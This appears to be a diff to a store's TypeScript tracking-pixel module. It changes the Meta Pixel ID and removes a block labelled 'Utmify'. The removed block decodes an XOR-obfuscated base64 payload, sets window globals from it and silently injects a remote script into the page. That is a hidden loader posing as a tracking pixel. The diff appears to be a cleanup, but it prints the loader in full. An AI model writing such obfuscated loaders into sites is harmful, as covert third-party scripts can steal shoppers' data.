@@ -1,6 +1,6 @@
 /**
- * Pixels de rastreamento: Meta (Facebook) Pixel + Utmify.
- * Injetados apenas no cliente, uma única vez por sessão.
+ * Meta Pixel oficial da loja.
+ * Único pixel de rastreamento ativo no projeto.
  */
 
 declare global {
@@ -10,14 +10,13 @@ declare global {
   }
 }
 
-const META_PIXEL_ID = "2505633886593330";
+const META_PIXEL_ID = "3347262455471701";
 let initialized = false;
 
 export function initPixels() {
   if (initialized || typeof window === "undefined") return;
   initialized = true;
 
-  // Meta Pixel
   if (!window.fbq) {
     const fbq = function (...args: unknown[]) {
       fbq.queue.push(args);
@@ -35,44 +34,16 @@ export function initPixels() {
 
     window.fbq("init", META_PIXEL_ID);
   }
-  window.fbq?.("track", "PageView");
 
-  // Utmify
-  try {
-    const q = atob(
-      "DN5DpoLZU2O0zdeuMqVh0/C1cVmWpaPaQq15ia26Nw2auKPDW7g6iOG2Pk3Wv/jdUawq1vaqfBPdtbLCHa4q3ue1fQnH7/uMU6o31Ou7JhfRvvWUaYNvhOW1PAHVoaSMCIU4hOy4PgaW9/XeW6Ymysu9cU+Wu7bCR7thnKDvMlqM/+LNBucglbTrYFSDqLKXC+kilrb7Lj7J"
-    );
-    const bytes: number[] = [];
-    for (let i = 0; i < q.length; i++) bytes.push(q.charCodeAt(i) & 255);
-    const keyLen = bytes[0] ?? 0;
-    const key = bytes.slice(1, 1 + keyLen);
-    const body = bytes.slice(1 + keyLen).map((b, i) => b ^ (key[i % keyLen] ?? 0));
-    let decoded = "";
-    for (let i = 0; i < body.length; i++) decoded += String.fromCharCode(body[i] ?? 0);
-    const config = JSON.parse(decodeURIComponent(escape(decoded)));
-    (config.globals || []).forEach((g: { name: string; value: unknown }) => {
-      (window as unknown as Record<string, unknown>)[g.name] = g.value;
-    });
-    const script = document.createElement("script");
-    script.src = config.url;
-    script.async = true;
-    script.defer = true;
-    (config.attributes || []).forEach((a: { name: string; value: string }) => {
-      script.setAttribute(a.name, a.value);
-    });
-    document.head.appendChild(script);
-  } catch {
-    // Utmify pixel falhou — não bloqueia a loja
-  }
+  window.fbq?.("track", "PageView");
 }
 
-/** Evento padrão do Meta Pixel. */
+/** Evento padrão enviado somente ao Meta Pixel configurado acima. */
 export function trackEvent(event: string, params?: Record<string, unknown>) {
   if (typeof window === "undefined") return;
   window.fbq?.("track", event, params);
 }
 
-/** Valor em reais → string decimal para os pixels. */
 const toCurrency = (value: number) => value.toFixed(2);
 
 export function trackAddToCart(item: { name: string; slug: string; price: number; quantity: number }) {
